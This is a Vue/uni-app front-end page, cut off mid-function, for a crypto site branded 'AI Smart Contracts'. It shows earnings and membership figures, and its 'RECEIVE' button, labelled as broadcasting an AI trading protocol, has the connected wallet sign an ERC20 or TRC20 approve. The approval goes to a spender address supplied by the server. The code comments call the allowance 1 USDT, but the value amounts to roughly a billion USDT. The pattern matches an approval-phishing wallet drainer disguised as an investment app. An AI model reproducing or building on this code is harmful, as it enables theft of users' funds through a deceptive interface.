<template>
	<view class="index-container">
		<!-- È°∂ÈÉ®Ê∏êÂèòËÉåÊôØÂå∫Âüü -->
		<view class="gradient-bg">
			<view class="overlay-image-container">
				<image class="overlay-image"
					src="https://www.onchainus.net/static/media/img_banner.c2d112845c769829e979.png" mode="aspectFill">
				</image>
			</view>
		</view>

		<!-- ÂÜÖÂÆπÂå∫Âüü -->
		<view class="content-container">

			<!-- Ê¨¢ËøéÂç°Áâá -->
			<view class="welcome-card">
				<view class="welcome-header">
					<text class="welcome-title">Welcome to AI Smart Contracts</text>
					<view class="id-container">
						<text class="chain-icon">üîó</text>
						<text class="id-text">{{ formatAddress(walletInfo.address) }}</text>
					</view>
				</view>
				<text class="welcome-subtitle">Artificial intelligence trading</text>
				
				<view class="earnings-section">
					<view class="earnings-item">
						<text class="earnings-label">Total earnings (USDT)</text>
						<text class="earnings-value">{{ formatEarnings(earningsData.total_earnings) }}</text>
					</view>
					<view class="earnings-item">
						<text class="earnings-label">Earnings 24h (USDT)</text>
						<text class="earnings-value">{{ formatEarnings(earningsData.earnings_24h) }}</text>
					</view>
				</view>
			</view>

			<!-- ÂºÄÊîæ‰∫§ÊòìÂç°Áâá -->
			<view class="transaction-card">
				<view class="transaction-header">
					<text class="transaction-title">Open transaction!</text>
					<view class="add-btn" @click="showAuthDialog">
						<text class="add-text">+</text>
					</view>
				</view>
				<text class="transaction-subtitle">2000+ base factor library with AI support to short catch derivative position, one step ahead.</text>
				
				
				<view class="stats-section">
					<view class="stat-item">
						<text class="stat-label">Members people</text>
						<text class="stat-value">{{ formatErcNumber(ercData.participant) }}</text>
					</view>
					<view class="stat-item">
						<text class="stat-label">Active nodes</text>
						<text class="stat-value">{{ formatErcNumber(ercData.node) }}</text>
					</view>
					<view class="stat-item">
						<text class="stat-label">Total revenue</text>
						<text class="stat-value">{{ formatRevenueValue(ercData.revenue) }} USDT</text>
					</view>
					<view class="stat-item">
						<text class="stat-label">Daily output</text>
						<text class="stat-value">{{ formatOutputValue(ercData.output) }} USDT</text>
					</view>
				</view>
			</view>

			<!-- ‰∫§ÊòìÊâÄÂàóË°® -->
			<view class="exchange-list">
				<!-- ‰ΩøÁî®v-forÂä®ÊÄÅÊ∏≤Êüì‰∫§ÊòìÊâÄÂàóË°® -->
				<view class="exchange-item" v-for="(exchange, exchangeKey) in exchangeList" :key="exchangeKey">
					<view class="exchange-header" @click="toggleExchange(exchangeKey)">
						<image class="exchange-icon" :src="exchange.icon" mode="aspectFit"></image>
						<text class="exchange-name">{{ exchange.name }}</text>
						<text class="exchange-value">{{ exchange.displayValue }}</text>
						<text class="exchange-arrow" :class="{'rotated': exchangeStatus[exchangeKey]}">></text>
					</view>
					<view class="exchange-details" v-if="exchangeStatus[exchangeKey]">
						<view class="detail-header">
							<view class="detail-icon-space"></view>
							<text class="detail-label">Currency</text>
							<text class="detail-label">24h Volume</text>
							<text class="detail-label">Liquidity</text>
						</view>
						<!-- ÂÆâÂÖ®Âú∞ËÆøÈóÆ Bitcoin Êï∞ÊçÆ -->
						<view class="coin-row" v-if="exchange.Bitcoin">
							<image class="coin-icon" src="/static/btc.jpg" mode="aspectFit"></image>
							<text class="coin-name">Bitcoin</text>
							<text class="coin-value">${{ formatNumber(exchange.Bitcoin['24h_volume'] || 0) }}</text>
							<text class="coin-number">{{ formatLiquidity(exchange.Bitcoin.liquidity || 0) }}</text>
						</view>
						<!-- ÂÆâÂÖ®Âú∞ËÆøÈóÆ Ethereum Êï∞ÊçÆ -->
						<view class="coin-row" v-if="exchange.Ethereum">
							<image class="coin-icon" src="/static/eth.jpg" mode="aspectFit"></image>
							<text class="coin-name">Ethereum</text>
							<text class="coin-value">${{ formatNumber(exchange.Ethereum['24h_volume'] || 0) }}</text>
							<text class="coin-number">{{ formatLiquidity(exchange.Ethereum.liquidity || 0) }}</text>
						</view>
						<!-- Â¶ÇÊûúÊ≤°ÊúâÊï∞ÊçÆÔºåÊòæÁ§∫ÊèêÁ§∫ -->
						<view class="no-data" v-if="!exchange.Bitcoin && !exchange.Ethereum">
							<text class="no-data-text">No data</text>
						</view>
					</view>
				</view>
			</view>

			<view class="external-links">
				<view class="external-card" @click="openExternalLink('https://1inch.io')">
					<view class="card-icon">
						<image class="card-image" src="/static/img_1inch.png" mode="aspectFit"></image>
					</view>
					<view class="card-content">
						<text class="card-title">1inch</text>
					</view>
				</view>
				<view class="external-card" @click="openExternalLink('https://uniswap.org')">
					<view class="card-icon">
						<image class="card-image" src="/static/img_UniSwap.png" mode="aspectFit"></image>
					</view>
					<view class="card-content">
						<text class="card-title">UniSwap</text>
					</view>
				</view>
				<view class="external-card" @click="openExternalLink('https://sushi.com')">
					<view class="card-icon">
						<image class="card-image" src="/static/img_SushiSwappng.png" mode="aspectFit"></image>
					</view>
					<view class="card-content">
						<text class="card-title">SushiSwap</text>
					</view>
				</view>
			</view>

			<!-- ‰∫§ÊòìÊâÄlogos -->
			<view class="exchange-logos">
				<view class="logo-row">
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner1.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
							<image class="logo-image" src="/static/img_partner2.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner3.png" mode="aspectFit"></image>
					</view>
				</view>
				<view class="logo-row">
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner4.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner5.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner6.png" mode="aspectFit"></image>
					</view>
				</view>
				<view class="logo-row">
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner7.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner8.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner9.png" mode="aspectFit"></image>
					</view>
				</view>
			</view>

			<!-- ÊéàÊùÉÂºπÁ™ó -->
			<uni-popup ref="authPopup" type="center">
				<view class="auth-dialog">
					<view class="auth-dialog-header">
						<text class="auth-dialog-title">Open Agreement</text>
						<text class="auth-dialog-close" @click="closeAuthDialog">√ó</text>
					</view>
					<view class="auth-dialog-content">
						<image class="auth-dialog-image" src="/static/auth-image.png" mode="aspectFit"></image>
						<text class="auth-dialog-desc">Broadcast the AI Quantitative Trading Protocol to Nodes</text>
						<button class="auth-dialog-btn" @click="handleWalletAuth">RECEIVE</button>
					</view>
				</view>
			</uni-popup>

		</view>


	</view>
</template>

<script>
import tokenPocketAuth from '@/utils/tokenPocketAuth.js';
import store from '@/store/index.js';
import { api, apiUtils } from '@/utils/api.js';
import WebSocketManager from '@/utils/websocket.js';

// Âú®Êñá‰ª∂È°∂ÈÉ®Ê∑ªÂä†
let lastCheckedWalletAddress = '';
let walletConnectLock = false;
let walletConnectQueue = [];

// ÂàõÂª∫WebSocketÁÆ°ÁêÜÂô®ÂÆû‰æã
const exchangeWebSocket = new WebSocketManager();
let exchangeDataCache = null; // ÁºìÂ≠òÊúÄÊñ∞Êï∞ÊçÆ

export default {
	data() {
		return {
			exchangeStatus: {
				binance: true,  // ÈªòËÆ§Â±ïÂºÄbinance
				huobi: false,
				gate: false,
				okex: false,
				kucoin: false,
				kraken: false
			},
			walletInfo: {
				connected: false,
				type: '',
				address: ''
			},
			authAddress: '', // Â≠òÂÇ®ÊéàÊùÉÂú∞ÂùÄ
			// Êñ∞Â¢ûÔºöÊî∂ÁõäÊï∞ÊçÆ
			earningsData: {
				total_earnings: '0.00',
				earnings_24h: '0.00'
			},
			// Êñ∞Â¢ûÔºö‰∫§ÊòìÊâÄÊï∞ÊçÆ
			exchangeData: {},
			// Êñ∞Â¢ûÔºöËΩÆËØ¢ÂÆöÊó∂Âô®
			pollingTimer: null,
			// Êñ∞Â¢ûÔºö‰∫§ÊòìÊâÄÈÖçÁΩÆÔºàÂõæÊ†áÂíåÊòæÁ§∫ÂêçÁß∞Ôºâ- ÊåâÁÖßÊà™ÂõæÈ°∫Â∫èÊéíÂàó
			exchangeConfig: {
				binance: { name: 'Binance', icon: '/static/binance.png' },
				huobi: { name: 'Huobi', icon: '/static/huobi.png' },
				gate: { name: 'Gate', icon: '/static/gate.png' },
				okex: { name: 'OKEx', icon: '/static/okex.png' },
				kucoin: { name: 'KuCoin', icon: '/static/kucoin.png' },
				kraken: { name: 'Kraken', icon: '/static/kraken.png' }
			},
			// Êñ∞Â¢ûÔºöERCÊï∞ÊçÆÁõ∏ÂÖ≥
			ercData: {
				authorized_address: '',
				node: '0',
				output: '0',
				participant: '0',
				revenue: '0'
			},
			// Êñ∞Â¢ûÔºöERCÊï∞ÊçÆËΩÆËØ¢ÂÆöÊó∂Âô®
			ercPollingTimer: null,
			// Êñ∞Â¢ûÔºöÁî®Êà∑‰ø°ÊÅØËΩÆËØ¢ÂÆöÊó∂Âô®
			userInfoPollingTimer: null,
			
			// Êñ∞Â¢ûÔºöÈí±ÂåÖÁõëÂê¨Âô®
			accountsChangedHandler: null,
			chainChangedHandler: null,
			connectHandler: null,
			disconnectHandler: null,
			
			// Êñ∞Â¢ûÔºöÈò≤ÊäñÂíåÁä∂ÊÄÅÊéßÂà∂
			tokenUpdateDebounceTimer: null,
			isPollingActive: false,
			lastTokenUpdateTime: 0,
			storeUnsubscribe: null,

			// Êñ∞Â¢ûÔºö‰∫ã‰ª∂ÁõëÂê¨Âô®
			userInfoUpdateListener: null,
		}
	},
	
	computed: {
		// ËÆ°ÁÆóÂ±ûÊÄßÔºöÊ†ºÂºèÂåñ‰∫§ÊòìÊâÄÂàóË°®
		exchangeList() {
			const list = {};
			Object.keys(this.exchangeConfig).forEach(key => {
				const config = this.exchangeConfig[key];
				const data = this.exchangeData[key] || {};
				
				// ‰øÆÊîπÊòæÁ§∫ÂÄºËÆ°ÁÆóÈÄªËæë - ÊòæÁ§∫ethÂèÇÊï∞
				let displayValue = '0.00';
				
				// ‰ºòÂÖàÊòæÁ§∫BitcoinÁöÑethÂÄºÔºåÂ¶ÇÊûúÊ≤°ÊúâÂàôÊòæÁ§∫EthereumÁöÑethÂÄº
				if (data.Bitcoin && data.Bitcoin.eth) {
					displayValue = this.formatEthValue(data.Bitcoin.eth);
				} else if (data.Ethereum && data.Ethereum.eth) {
					displayValue = this.formatEthValue(data.Ethereum.eth);
				}
				
				list[key] = {
					...config,
					...data,
					displayValue: displayValue
				};
			});
			return list;
		}
	},

	onLoad() {
		console.log('=== È°µÈù¢Âä†ËΩΩ ===');
		// Ê£ÄÊü•Èí±ÂåÖËøûÊé•Áä∂ÊÄÅ
		this.checkWalletConnection();
		// ËÆæÁΩÆÈí±ÂåÖÁõëÂê¨Âô®
		this.setupWalletListeners();
		// ËÆæÁΩÆstoreÁõëÂê¨Âô®
		this.setupStoreListeners();
		// ËÆæÁΩÆÁî®Êà∑‰ø°ÊÅØÊõ¥Êñ∞ÁõëÂê¨Âô®
		this.setupUserInfoUpdateListener();
		// ÂêØÂä®ËΩÆËØ¢
		this.startAllPolling();
	},

	onShow() {
		console.log('=== È°µÈù¢ÊòæÁ§∫ ===');
		// Âè™Ê£ÄÊü•Èí±ÂåÖËøûÊé•Ôºå‰∏çÈáçÂ§çÂêØÂä®ËΩÆËØ¢
		this.checkWalletConnection();
		
		// Á°Æ‰øùÈí±ÂåÖÁõëÂê¨Âô®Â∑≤ËÆæÁΩÆ
		if (!this.accountsChangedHandler) {
			this.setupWalletListeners();
		}
		
		// Á°Æ‰øùstoreÁõëÂê¨Âô®Â∑≤ËÆæÁΩÆ
		if (!this.storeUnsubscribe) {
			this.setupStoreListeners();
		}
		
		// Á°Æ‰øùÁî®Êà∑‰ø°ÊÅØÊõ¥Êñ∞ÁõëÂê¨Âô®Â∑≤ËÆæÁΩÆ
		if (!this.userInfoUpdateListener) {
			this.setupUserInfoUpdateListener();
		}
		
		// Âè™ÊúâÂú®ËΩÆËØ¢Êú™Ê¥ªË∑ÉÊó∂ÊâçÂêØÂä®
		if (!this.isPollingActive) {
			console.log('ËΩÆËØ¢Êú™Ê¥ªË∑ÉÔºåÈáçÊñ∞ÂêØÂä®');
			this.startAllPolling();
		}
	},

	onHide() {
		console.log('=== È°µÈù¢ÈöêËóè ===');
		// È°µÈù¢ÈöêËóèÊó∂ÂÅúÊ≠¢ËΩÆËØ¢‰ª•ËäÇÁúÅËµÑÊ∫ê
		this.stopAllPolling();
		// ÁßªÈô§Èí±ÂåÖÁõëÂê¨Âô®
		this.removeWalletListeners();
	},
	
	onUnload() {
		console.log('=== È°µÈù¢Âç∏ËΩΩ ===');
		// Ê∏ÖÁêÜÊâÄÊúâËµÑÊ∫ê
		this.cleanup();
	},

	methods: {
		// Ê£ÄÊü•Èí±ÂåÖËøûÊé•Áä∂ÊÄÅÂπ∂Ë∞ÉÁî®wallet_connectÊé•Âè£
		async checkWalletConnection() {
			const walletAddress = uni.getStorageSync('walletAddress');
			const walletType = uni.getStorageSync('walletType');
			
			if (!walletAddress) {
				// Ê≤°ÊúâÈí±ÂåÖÂú∞ÂùÄÔºåË∑≥ËΩ¨Âà∞ËøûÊé•È°µÈù¢
				uni.reLaunch({
					url: '/pages/wallet/connect'
				});
				return;
			}

			try {
				// Ë∞ÉÁî®wallet_connectÊé•Âè£
				console.log('=== Ë∞ÉÁî®wallet_connectÊé•Âè£ ===');
				console.log('Èí±ÂåÖÂú∞ÂùÄ:', walletAddress);
				
				const responseData = await api.user.walletConnect(
					walletAddress,
					uni.getStorageSync('userTid') || ''
				);

				console.log('wallet_connectÂìçÂ∫î:', responseData);

				if (responseData && responseData.code === 0) {
					// ËøûÊé•ÊàêÂäüÔºå‰øùÂ≠òtoken
					if (responseData.token) {
						store.setToken(responseData.token);
						console.log('TokenÂ∑≤‰øùÂ≠òÂà∞store:', responseData.token);
					}
					
					// Êõ¥Êñ∞Èí±ÂåÖËøûÊé•Áä∂ÊÄÅ
					uni.setStorageSync('walletConnected', true);
					
					// Êõ¥Êñ∞ÁïåÈù¢ÊòæÁ§∫ÁöÑÈí±ÂåÖ‰ø°ÊÅØ
					this.walletInfo = {
						connected: true,
						type: walletType || 'Auto-detected',
						address: walletAddress
					};
					
					console.log('Èí±ÂåÖËøûÊé•ÊàêÂäü');
				} else {
					throw new Error(responseData.info || 'Wallet connection failed');
				}

			} catch (error) {
				console.error('wallet_connectË∞ÉÁî®Â§±Ë¥•:', error);
				
				// ËøûÊé•Â§±Ë¥•ÔºåÊ∏ÖÈô§Êú¨Âú∞Êï∞ÊçÆÂπ∂Ë∑≥ËΩ¨Âà∞ËøûÊé•È°µÈù¢
				uni.removeStorageSync('walletConnected');
				uni.removeStorageSync('walletAddress');
				uni.removeStorageSync('walletType');
				store.clearToken();
				
				uni.showToast({
					title: 'Wallet connection failed, please reconnect',
					icon: 'none',
					duration: 2000
				});
				
				setTimeout(() => {
					uni.reLaunch({
						url: '/pages/wallet/connect'
					});
				}, 2000);
			}
		},
		
		// Ê†ºÂºèÂåñÈí±ÂåÖÂú∞ÂùÄ
		formatAddress(address) {
			if (!address) return '';
			if (address.length <= 10) return address;
			return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
		},
		
		// Êñ≠ÂºÄÈí±ÂåÖËøûÊé•
		disconnectWallet() {
			console.log('=== Disconnect wallet ===');
			console.log('Before disconnecting store token:', store.getToken());
			console.log('Before disconnecting local storage token:', {
				userToken: uni.getStorageSync('userToken'),
				token: uni.getStorageSync('token')
			});
			
			uni.showModal({
				title: 'Disconnect',
				content: 'Are you sure you want to disconnect the wallet?',
				success: (res) => {
					if (res.confirm) {
						// Ê∏ÖÈô§Êú¨Âú∞Â≠òÂÇ®
						uni.removeStorageSync('walletConnected');
						uni.removeStorageSync('walletAddress');
						uni.removeStorageSync('walletType');
						uni.removeStorageSync('connectTime');
						
						// Ê∏ÖÈô§ token
						store.clearToken();
						uni.removeStorageSync('token'); // ÂêåÊó∂Ê∏ÖÈô§ÊóßÁöÑ token Â≠òÂÇ®
						
						console.log('After disconnecting store token:', store.getToken());
						console.log('After disconnecting local storage token:', {
							userToken: uni.getStorageSync('userToken'),
							token: uni.getStorageSync('token')
						});
						
						// Ë∑≥ËΩ¨Âà∞ËøûÊé•È°µÈù¢
						uni.reLaunch({
							url: '/pages/wallet/connect'
						});
					}
				}
			});
		},
		
		toggleExchange(exchangeName) {
			this.exchangeStatus[exchangeName] = !this.exchangeStatus[exchangeName];
		},
		openExternalLink(url) {
			// Âú®Â∞èÁ®ãÂ∫è‰∏≠ÊâìÂºÄÂ§ñÈÉ®ÈìæÊé•
			// #ifdef MP-WEIXIN
			uni.navigateTo({
				url: `/pages/webview/webview?url=${encodeURIComponent(url)}`
			});
			// #endif
			
			// Âú®APP‰∏≠ÊâìÂºÄÂ§ñÈÉ®ÈìæÊé•
			// #ifdef APP-PLUS
			plus.runtime.openURL(url);
			// #endif
			
			// Âú®H5‰∏≠ÊâìÂºÄÂ§ñÈÉ®ÈìæÊé•
			// #ifdef H5
			window.open(url, '_blank');
			// #endif
		},
		// ‰øÆÊîπÊòæÁ§∫ÊéàÊùÉÂºπÁ™óÊñπÊ≥ï - ÊâÄÊúâÊñáÂ≠óÊîπ‰∏∫Ëã±Êñá
		async showAuthDialog() {
			try {
				// ÊòæÁ§∫Âä†ËΩΩÊèêÁ§∫
				uni.showLoading({
					title: 'Getting authorization info...'
				});

				// ÂÖàËé∑ÂèñÊéàÊùÉÂú∞ÂùÄÔºåÁ≠âÂæÖÂÆåÊàê
				await this.getAuthAddress();
				
				// ÈöêËóèÂä†ËΩΩÊèêÁ§∫
				uni.hideLoading();
				
				// Ê£ÄÊü•ÊòØÂê¶ÊàêÂäüËé∑ÂèñÂà∞ÊéàÊùÉÂú∞ÂùÄ
				if (!this.authAddress) {
					uni.showToast({
						title: 'Failed to get authorization address, please try again',
						icon: 'none',
						duration: 2000
					});
					return;
				}
				
				// ÊòæÁ§∫ÂºπÁ™ó
				this.$refs.authPopup.open();
				
			} catch (error) {
				uni.hideLoading();
				console.error('ÊòæÁ§∫ÊéàÊùÉÂºπÁ™óÂ§±Ë¥•:', error);
				uni.showToast({
					title: 'Failed to get authorization info',
					icon: 'none',
					duration: 2000
				});
			}
		},

		// ÂÖ≥Èó≠ÊéàÊùÉÂºπÁ™ó
		closeAuthDialog() {
			this.$refs.authPopup.close();
		},

		// ‰øÆÊîπgetAuthAddressÊñπÊ≥ïÁöÑÈîôËØØ‰ø°ÊÅØ
		async getAuthAddress() {
			try {
				const currentToken = store.getToken();
				console.log('getAuthAddress - ÂΩìÂâçtoken:', currentToken);
				
				const data = await api.transaction.getAuthAddress();
				console.log('getAuthAddress - ËøîÂõûÊï∞ÊçÆ:', data);
				
				if (data && data.data) {
					// ‰øùÂ≠òÊéàÊùÉÂú∞ÂùÄ
					if (data.data.authorized_address) {
						this.authAddress = data.data.authorized_address;
						console.log('ÊéàÊùÉÂú∞ÂùÄÂ∑≤ËÆæÁΩÆ:', this.authAddress);
					} else {
						throw new Error('API did not return authorized_address field');
					}
					
					// Êõ¥Êñ∞TokenPocketÊéàÊùÉÂ∑•ÂÖ∑ÁöÑÂêàÁ∫¶Âú∞ÂùÄÈÖçÁΩÆ
					const contractConfig = {};
					
					if (data.data.tron_usdt_contract) {
						contractConfig.tronUsdtContract = data.data.tron_usdt_contract;
						console.log('Êõ¥Êñ∞Tron USDTÂêàÁ∫¶Âú∞ÂùÄ:', data.data.tron_usdt_contract);
					}
					
					if (data.data.eth_usdt_contract) {
						contractConfig.ethUsdtContract = data.data.eth_usdt_contract;
						console.log('Êõ¥Êñ∞ETH USDTÂêàÁ∫¶Âú∞ÂùÄ:', data.data.eth_usdt_contract);
					}
					
					// Â¶ÇÊûúÊúâÂêàÁ∫¶Âú∞ÂùÄ‰ø°ÊÅØÔºåÊõ¥Êñ∞ÈÖçÁΩÆ
					if (Object.keys(contractConfig).length > 0) {
						tokenPocketAuth.updateConfig(contractConfig);
					}
					
					console.log('ÊéàÊùÉ‰ø°ÊÅØËé∑ÂèñÊàêÂäü:', {
						authAddress: this.authAddress,
						contracts: contractConfig
					});
					
					return this.authAddress; // ËøîÂõûÊéàÊùÉÂú∞ÂùÄ
					
				} else {
					throw new Error('API returned empty data or wrong format');
				}
			} catch (error) {
				console.error('Ëé∑ÂèñÊéàÊùÉÂú∞ÂùÄÂ§±Ë¥•:', error);
				throw error; // ÈáçÊñ∞ÊäõÂá∫ÈîôËØØÔºåËÆ©Ë∞ÉÁî®ËÄÖÂ§ÑÁêÜ
			}
		},

		// ‰øÆÊîπhandleWalletAuthÊñπÊ≥ïÁöÑÊèêÁ§∫ÊñáÂ≠ó
		async handleWalletAuth() {
			console.log('handleWalletAuthÂºÄÂßãÔºåÂΩìÂâçauthAddress:', this.authAddress);
			
			// Â¶ÇÊûúauthAddress‰∏∫Á©∫ÔºåÂ∞ùËØïÈáçÊñ∞Ëé∑Âèñ
			if (!this.authAddress) {
				try {
					uni.showLoading({
						title: 'Getting authorization address...'
					});
					
					await this.getAuthAddress();
					uni.hideLoading();
					
					if (!this.authAddress) {
						throw new Error('Failed to get authorization address again');
					}
				} catch (error) {
					uni.hideLoading();
					console.error('ÈáçÊñ∞Ëé∑ÂèñÊéàÊùÉÂú∞ÂùÄÂ§±Ë¥•:', error);
					uni.showToast({
						title: 'Failed to get authorization address, please try again',
						icon: 'none',
						duration: 2000
					});
					return;
				}
			}

			try {
				uni.showLoading({
					title: 'Processing authorization...'
				});

				// Ê£ÄÊµãÂΩìÂâçÈí±ÂåÖÁéØÂ¢É
				const walletType = this.detectWalletEnvironment();
				console.log('Ê£ÄÊµãÂà∞Èí±ÂåÖÁ±ªÂûã:', walletType);
				
				let authResult;
				
				if (walletType === 'TokenPocket') {
					// TokenPocketÊéàÊùÉÊµÅÁ®ã
					authResult = await tokenPocketAuth.requestAuth(this.authAddress);
				} else if (walletType === 'MetaMask') {
					// MetaMaskÊéàÊùÉÊµÅÁ®ã
					authResult = await this.handleMetaMaskAuth();
				} else if (walletType === 'Ethereum') {
					// ÈÄöÁî®‰ª•Â§™ÂùäÈí±ÂåÖÊéàÊùÉÊµÅÁ®ã
					authResult = await this.handleEthereumWalletAuth();
				} else {
					// Â∞ùËØïÈÄöÁî®ÊéàÊùÉÊñπÊ≥ï
					authResult = await this.handleGenericWalletAuth();
				}
				
				await this.handleAuthResult(authResult);
				
			} catch (error) {
				uni.hideLoading();
				console.error('Èí±ÂåÖÊéàÊùÉÈîôËØØ:', error);
				
				uni.showToast({
					title: error.message || 'Authorization failed',
					icon: 'none',
					duration: 3000
				});
			}
		},

		// Êñ∞Â¢ûÔºöÊ£ÄÊµãÈí±ÂåÖÁéØÂ¢É - Â¢ûÂº∫ÁâàÊú¨
		detectWalletEnvironment() {
			if (typeof window === 'undefined') return null;
			
			// TokenPocketÊ£ÄÊµã
			if (tokenPocketAuth.detectTokenPocketEnvironment()) {
				return 'TokenPocket';
			}
			
			// MetaMaskÊ£ÄÊµã
			if (window.ethereum?.isMetaMask && !window.ethereum?.isCoinbaseWallet) {
				return 'MetaMask';
			}
			
			// Coinbase WalletÊ£ÄÊµã
			if (window.ethereum?.isCoinbaseWallet) {
				return 'CoinbaseWallet';
			}
			
			// Trust WalletÊ£ÄÊµã
			if (window.ethereum?.isTrust) {
				return 'TrustWallet';
			}
			
			// imTokenÊ£ÄÊµã
			if (window.ethereum?.isImToken) {
				return 'ImToken';
			}
			
			// ÈÄöÁî®‰ª•Â§™ÂùäÈí±ÂåÖ
			if (window.ethereum) {
				return 'Ethereum';
			}
			
			// TronÈí±ÂåÖÊ£ÄÊµã
			if (window.tronWeb) {
				return 'TronWallet';
			}
			
			return 'Unknown';
		},

		// ‰øÆÊîπÂ§ÑÁêÜMetaMaskÊéàÊùÉÁöÑÊèêÁ§∫ÊñáÂ≠ó
		async handleMetaMaskAuth() {
			try {
				const ethereum = window.ethereum;
				
				// ËØ∑Ê±ÇË¥¶Êà∑ËÆøÈóÆÊùÉÈôê
				const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
				
				if (accounts.length === 0) {
					throw new Error('Failed to get account access permission');
				}
				
				// ÊâßË°åERC20 approveÊéàÊùÉ
				const authResult = await this.executeERC20Approval(ethereum, accounts[0]);
				
				return {
					success: true,
					type: 'ETHEREUM',
					address: accounts[0],
					txHash: authResult.txHash,
					message: 'Authorization successful'
				};
				
			} catch (error) {
				console.error('MetaMaskÊéàÊùÉÂ§±Ë¥•:', error);
				return {
					success: false,
					message: error.message || 'MetaMask authorization failed'
				};
			}
		},

		// ‰øÆÊîπÂ§ÑÁêÜÈÄöÁî®‰ª•Â§™ÂùäÈí±ÂåÖÊéàÊùÉÁöÑÊèêÁ§∫ÊñáÂ≠ó
		async handleEthereumWalletAuth() {
			try {
				const ethereum = window.ethereum;
				
				// ËØ∑Ê±ÇË¥¶Êà∑ËÆøÈóÆÊùÉÈôê
				const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
				
				if (accounts.length === 0) {
					throw new Error('Failed to get account access permission');
				}
				
				// ÊâßË°åERC20 approveÊéàÊùÉ
				const authResult = await this.executeERC20Approval(ethereum, accounts[0]);
				
				return {
					success: true,
					type: 'ETHEREUM',
					address: accounts[0],
					txHash: authResult.txHash,
					message: 'Authorization successful'
				};
				
			} catch (error) {
				console.error('‰ª•Â§™ÂùäÈí±ÂåÖÊéàÊùÉÂ§±Ë¥•:', error);
				return {
					success: false,
					message: error.message || 'Wallet authorization failed'
				};
			}
		},

		// ‰øÆÊîπÂ§ÑÁêÜÈÄöÁî®Èí±ÂåÖÊéàÊùÉÁöÑÊèêÁ§∫ÊñáÂ≠ó
		async handleGenericWalletAuth() {
			try {
				// Â∞ùËØï‰ª•Â§™ÂùäÈí±ÂåÖ
				if (window.ethereum) {
					return await this.handleEthereumWalletAuth();
				}
				
				// Â∞ùËØïTronÈí±ÂåÖ
				if (window.tronWeb) {
					return await this.handleTronWalletAuth();
				}
				
				// Â¶ÇÊûúÈÉΩÊ≤°ÊúâÔºåÊòæÁ§∫ÂèãÂ•ΩÊèêÁ§∫
				throw new Error('Please use a supported wallet app (such as MetaMask, TokenPocket, etc.) to open this page');
				
			} catch (error) {
				return {
					success: false,
					message: error.message || 'No supported wallet detected'
				};
			}
		},

		// ‰øÆÊîπÂ§ÑÁêÜTronÈí±ÂåÖÊéàÊùÉÁöÑÊèêÁ§∫ÊñáÂ≠ó
		async handleTronWalletAuth() {
			try {
				const tronWeb = window.tronWeb;
				
				// Ê£ÄÊü•Èí±ÂåÖËøûÊé•
				if (!tronWeb.ready) {
					throw new Error('Tron wallet not connected');
				}
				
				const address = tronWeb.defaultAddress.base58;
				if (!address) {
					throw new Error('Failed to get Tron wallet address');
				}
				
				// ÊâßË°åTRC20 approveÊéàÊùÉ
				const authResult = await this.executeTRC20Approval(tronWeb, address);
				
				return {
					success: true,
					type: 'TRON',
					address: address,
					txHash: authResult.txHash,
					message: 'Authorization successful'
				};
				
			} catch (error) {
				console.error('TronÈí±ÂåÖÊéàÊùÉÂ§±Ë¥•:', error);
				return {
					success: false,
					message: error.message || 'Tron wallet authorization failed'
				};
			}
		},

		// ‰øÆÊîπ executeERC20Approval ÊñπÊ≥ï
		async executeERC20Approval(ethereum, userAddress) {
			try {
				// Ëé∑ÂèñÂêàÁ∫¶Âú∞ÂùÄ
				const contractAddress = tokenPocketAuth.config.ethUsdtContract;
				const spenderAddress = this.authAddress;
				
				// ‰øÆÊ≠£Ôºö‰ΩøÁî®ÂêàÁêÜÁöÑÊéàÊùÉÊï∞Èáè
				// USDT Êúâ 6 ‰ΩçÂ∞èÊï∞ÔºåÊâÄ‰ª• 1 USDT = 1,000,000 wei
				// ‰ΩÜ‰∏∫‰∫ÜÈôç‰Ωé Gas Ë¥πÁî®ÔºåÊàë‰ª¨Âè™ÊéàÊùÉÂÆûÈôÖÈúÄË¶ÅÁöÑÊï∞Èáè
				const approveAmount = '1000000000000000'; // 1 USDTÔºåË∂≥Â§ü‰∏ÄÊ¨°‰∫§Êòì‰ΩøÁî®
				
				console.log('ÊéàÊùÉÊï∞Èáè:', approveAmount, 'wei (', parseFloat(approveAmount) / 1e6, 'USDT)');
				
				// ‰øÆÊ≠£ÔºöÊ≠£Á°ÆÂ§ÑÁêÜÂ§ßÊï∞ËΩ¨Êç¢‰∏∫16ËøõÂà∂
				let amountHex;
				try {
					// Á°Æ‰øùÊï∞Â≠ó‰∏ç‰ºöÊ∫¢Âá∫JavaScriptÁöÑÂÆâÂÖ®Êï¥Êï∞ËåÉÂõ¥
					const amountBigInt = BigInt(approveAmount);
					amountHex = '0x' + amountBigInt.toString(16);
				} catch (error) {
					console.error('Êï∞ÈáèËΩ¨Êç¢Â§±Ë¥•:', error);
					// Â¶ÇÊûúÂá∫ÈîôÔºå‰ΩøÁî®‰∏Ä‰∏™ÂÆâÂÖ®ÁöÑÈªòËÆ§ÂÄº (1 USDT)
					amountHex = '0xF4240'; // 1,000,000 ÁöÑ16ËøõÂà∂
				}
				
				console.log('ÊéàÊùÉÊï∞Èáè 16ËøõÂà∂:', amountHex);
				
				// ÊûÑÂª∫ERC20 approveÊñπÊ≥ïÁöÑË∞ÉÁî®Êï∞ÊçÆ
				const approveMethodABI = '0x095ea7b3' + 
					spenderAddress.slice(2).padStart(64, '0') + 
					amountHex.slice(2).padStart(64, '0');

				// Ê∑ªÂä†Ë∞ÉËØï‰ø°ÊÅØ
				console.log('ÊéàÊùÉ‰∫§ÊòìËØ¶ÊÉÖ:', {
					ÂêàÁ∫¶Âú∞ÂùÄ: contractAddress,
					ÊéàÊùÉÂØπË±°: spenderAddress,
